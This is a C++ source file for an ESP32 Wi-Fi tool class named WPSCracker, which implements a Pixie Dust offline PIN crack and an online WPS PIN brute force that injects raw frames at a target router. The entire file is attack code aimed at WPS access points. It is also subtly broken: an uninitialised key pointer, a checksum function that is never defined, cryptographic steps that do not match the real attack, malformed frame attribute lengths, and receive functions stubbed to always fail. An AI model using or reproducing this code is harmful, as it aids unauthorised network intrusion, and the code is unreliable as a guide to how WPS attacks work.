#include "WPSCracker.h"
#include "SDInterface.h"
#include <mbedtls/sha256.h>
#include <mbedtls/aes.h>
#include <mbedtls/bignum.h>
#include "esp_wifi.h"

extern SDInterface sd_obj;

static void hmac_sha256(const uint8_t *key, size_t key_len, const uint8_t *data, size_t data_len, uint8_t *output) {
    mbedtls_sha256_context ctx;
    mbedtls_sha256_init(&ctx);

    uint8_t k[64];
    uint8_t k_ipad[64];
    uint8_t k_opad[64];
    size_t i;

    if (key_len > 64) {
        mbedtls_sha256(key, key_len, k, 0);
        key_len = 32;
    } else {
        memcpy(k, key, key_len);
    }
    memset(k + key_len, 0, 64 - key_len);

    for (i = 0; i < 64; i++) {
        k_ipad[i] = k[i] ^ 0x36;
        k_opad[i] = k[i] ^ 0x5c;
    }

    mbedtls_sha256_starts(&ctx, 0);
    mbedtls_sha256_update(&ctx, k_ipad, 64);
    mbedtls_sha256_update(&ctx, data, data_len);
    uint8_t hash[32];
    mbedtls_sha256_finish(&ctx, hash);

    mbedtls_sha256_starts(&ctx, 0);
    mbedtls_sha256_update(&ctx, k_opad, 64);
    mbedtls_sha256_update(&ctx, hash, 32);
    mbedtls_sha256_finish(&ctx, output);

    mbedtls_sha256_free(&ctx);
}

void extractWPSData(uint8_t *m, size_t m_len, uint8_t *&pke, uint8_t *&e_nonce, uint8_t *&hash1, uint8_t *&hash2) {
    uint8_t *data = m + 43;
    size_t len = m_len - 43;
    int pos = 0;
    while (pos < len - 3) {
        uint16_t id = (data[pos] << 8) | data[pos + 1];
        uint16_t attr_len = (data[pos + 2] << 8) | data[pos + 3];
        pos += 4;
        if (id == 0x1032) pke = data + pos;
        if (id == 0x101a) e_nonce = data + pos;
        if (id == 0x1011) hash1 = data + pos;
        if (id == 0x1012) hash2 = data + pos;
        pos += attr_len;
    }
}

void extractWPSData(uint8_t *m, size_t m_len, uint8_t *&pkr, uint8_t *&r_nonce) {
    uint8_t *data = m + 43;
    size_t len = m_len - 43;
    int pos = 0;
    while (pos < len - 3) {
        uint16_t id = (data[pos] << 8) | data[pos + 1];
        uint16_t attr_len = (data[pos + 2] << 8) | data[pos + 3];
        pos += 4;
        if (id == 0x1034) pkr = data + pos;
        if (id == 0x1039) r_nonce = data + pos;
        pos += attr_len;
    }
}

void buildM1(uint8_t *bssid, String pin_str, uint8_t *m1) {
    // This is a simplified M1 frame, many attributes are missing
    uint8_t frame[] = {
        0x88, 0x8e, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, /* EAPOL header */
        0x02, 0x01, 0x00, 0x5f, 0x10, 0x4a, 0x00, 0x01, /* WSC header */
        0x10, 0x00, 0x5f, 0x10, 0x0e, 0x00, 0x08, /* UUID */
        0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef,
        0x10, 0x21, 0x00, 0x09, /* MAC Address */
        0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,
        0x10, 0x23, 0x00, 0x09, /* Enrollee Nonce */
        0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef,
        0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef,
        0x10, 0x0a, 0x00, 0x02, /* Public Key */
        0x01, 0x00,
        0x10, 0x0e, 0x00, 0x02, /* Authentication Type Flags */
        0x00, 0x01,
        0x10, 0x0f, 0x00, 0x02, /* Encryption Type Flags */
        0x00, 0x01,
        0x10, 0x10, 0x00, 0x02, /* Connection Type Flags */
        0x00, 0x01,
        0x10, 0x1a, 0x00, 0x02, /* Config Methods */
        0x00, 0x80,
        0x10, 0x20, 0x00, 0x08, /* WPS State */
        0x00,
        0x10, 0x22, 0x00, 0x08, /* Manufacturer */
        'E', 'S', 'P', 'R', 'E', 'S', 'S', 'I', 'F',
        0x10, 0x2d, 0x00, 0x08, /* Model Name */
        'E', 'S', 'P', '3', '2',
        0x10, 0x2e, 0x00, 0x08, /* Model Number */
        '1', '2', '3', '4', '5',
        0x10, 0x3b, 0x00, 0x08, /* Serial Number */
        '1', '2', '3', '4', '5', '6', '7', '8',
        0x10, 0x4e, 0x00, 0x08, /* Primary Device Type */
        0x00, 0x01, 0x00, 0x50, 0xf2, 0x04, 0x00, 0x01
    };
    memcpy(m1, frame, sizeof(frame));
}

void sendWPSFrame(uint8_t *bssid, uint8_t *frame, int len) {
    uint8_t packet[512];
    memcpy(packet, frame, len);

    // Get our MAC address
    uint8_t my_mac[6];
    esp_wifi_get_mac(WIFI_IF_AP, my_mac);

    // Preenche MACs
    memcpy(packet + 4, bssid, 6);     // Receiver
    memcpy(packet + 10, my_mac, 6);   // Source
    memcpy(packet + 16, bssid, 6);    // BSSID

    esp_wifi_80211_tx(WIFI_IF_AP, packet, len, false);
}

bool receiveFrame(uint8_t *frame, int type, int timeout) {
    // This function will be implemented later
    return false;
}

bool receiveM7Success() {
    // This function will be implemented later
    return false;
}

WPSCracker::WPSCracker()
{
}

bool WPSCracker::pixieDustAttack(uint8_t *m1, size_t m1_len, uint8_t *m2, size_t m2_len, uint8_t *m3, size_t m3_len, String &pin, String manufacturer) {
    uint8_t *pke, *pkr, *e_nonce, *r_nonce, *e_hash1, *e_hash2, *authkey;
    extractWPSData(m1, m1_len, pke, e_nonce, e_hash1, e_hash2);
    extractWPSData(m2, m2_len, pke, e_nonce, e_hash1, e_hash2);
    extractWPSData(m3, m3_len, pkr, r_nonce);

    uint8_t es1[16], es2[16];
    uint8_t k1[32], k2[32];
    uint8_t psk1[16], psk2[16];

    hmac_sha256(authkey, 32, e_nonce, 16, k1);
    memcpy(psk1, k1, 16);
    hmac_sha256(authkey, 32, psk1, 16, k2);
    memcpy(psk2, k2, 16);

    for (int i = 0; i < 10000000; i++) {
        uint32_t pin_tmp = i;
        uint32_t checksum = wps_pin_checksum(pin_tmp);
        uint32_t full_pin = pin_tmp * 10 + checksum;

        char pin_str[9];
        sprintf(pin_str, "%08d", full_pin);

        hmac_sha256(psk1, 16, (uint8_t*)pin_str, 4, es1);
        hmac_sha256(psk2, 16, (uint8_t*)pin_str + 4, 4, es2);

        uint8_t e_s1[16], e_s2[16];
        mbedtls_aes_context aes;
        mbedtls_aes_init(&aes);
        mbedtls_aes_setkey_enc(&aes, authkey, 256);
        mbedtls_aes_crypt_ecb(&aes, MBEDTLS_AES_ENCRYPT, es1, e_s1);
        mbedtls_aes_crypt_ecb(&aes, MBEDTLS_AES_ENCRYPT, es2, e_s2);
        mbedtls_aes_free(&aes);

        uint8_t e_s1_xor[16], e_s2_xor[16];
        for(int j=0; j<16; j++) {
            e_s1_xor[j] = e_s1[j] ^ r_nonce[j];
            e_s2_xor[j] = e_s2[j] ^ r_nonce[j];
        }

        uint8_t hash1[32], hash2[32];
        hmac_sha256(authkey, 32, e_s1_xor, 16, hash1);
        hmac_sha256(authkey, 32, e_s2_xor, 16, hash2);

        if(memcmp(hash1, e_hash1, 16) == 0 && memcmp(hash2, e_hash2, 16) == 0) {
            pin = String(full_pin);
            while(pin.length() < 8) pin = "0" + pin;
            return true;
        }
    }

    return false;
}

bool WPSCracker::onlineBruteWPS(uint8_t *bssid, String &pin) {
    uint8_t m1[256], m2[256];
    int attempts = 0;

    for (int p = 0; p <= 9999999; p++) {
        if (!checkWPSChecksum(p)) continue;

        String pin_str = String(p);
        while (pin_str.length() < 8) pin_str = "0" + pin_str;

        buildM1(bssid, pin_str, m1);
        sendWPSFrame(bssid, m1, sizeof(m1));
        if (receiveFrame(m2, 0x88, 1000)) {
            if (receiveM7Success()) {
                pin = pin_str;
                return true;
            }
        }

        attempts++;

        if (attempts > 11000) return false;
    }
    return false;
}

bool WPSCracker::checkWPSChecksum(int pin) {
    unsigned int accum = 0;
    pin *= 10;
    accum += 3 * (pin / 10000000 % 10);
    accum += 1 * (pin / 1000000 % 10);
    accum += 3 * (pin / 100000 % 10);
    accum += 1 * (pin / 10000 % 10);
    accum += 3 * (pin / 1000 % 10);
    accum += 1 * (pin / 100 % 10);
    accum += 3 * (pin / 10 % 10);
    accum += 1 * (pin / 1 % 10);
    return (accum % 10 == 0);
}

void WPSCracker::derivePixieKey(int pin, uint8_t *pub_key, uint8_t *nonce, uint8_t *derived) {
  // Not used in this implementation
}
